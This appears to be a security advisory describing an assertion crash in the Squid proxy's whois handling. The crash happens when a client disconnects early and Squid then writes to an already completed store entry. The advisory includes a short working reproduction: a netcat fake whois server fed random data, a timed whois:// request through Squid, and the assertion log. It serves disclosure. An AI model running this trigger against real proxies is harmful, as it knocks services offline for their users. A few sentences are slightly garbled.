
# Whois Assertion Crash

Note: This issue is similar to that of `RFC 2141 / 2169 (URN) Assertion Crash`, and thus a detailed description is not given. However, this issue pertains to how Squid handles whois of WHOIS requests to whois servers.

## The Issue
When a client opens a connection with Squid and subsequently closes it, its so-called 'store entry' is marked as 'pending' (STORE_PENDING) and 'completed' (STORE_OK) respectively. If an attempt is subsequently made to write to that store entry after it has been set to STORE_OK, Squid will crash with an assertion, as it generally means something is 'wrong'.

Due to Squid marking a store as 'completed' upon a client disconnecting, it is possible to trick Squid into requesting a whois page, then quickly disconnecting, resulting in a write to a store which has been marked as STORE_OK.

In theory, this issue could affect HTTP too, however there are protections in place within the HTTP end-points to stop the processing of asynchronous replies when an entry has been aborted (such as due to a client closing the connection before the reply has been read) For example in `HttpStateData::readReply` and `HttpStateData::processReplyBody`, there is a check before the entry writing:
```
    if (EBIT_TEST(entry->flags, ENTRY_ABORTED)) {
        abortTransaction("store entry aborted while reading reply");
        return;
    }
```

It is trivial to cause this issue whois a whois:// request.
In one window, running
```
cat /dev/urandom | sudo nc -k -l 43
```
will act as a whois server.
In another window, we connect to this "whois server" through Squid, and disconnect quickly:
```
printf "GET whois://localhost/ HTTP/1.1\r\n\r\n" | timeout 0.1 nc localhost 3128 2>&1 > /dev/null
```
which results in the assertion:
```
2021/04/20 00:38:12.271| assertion failed: store.cc:832: "store_status == STORE_PENDING"
```
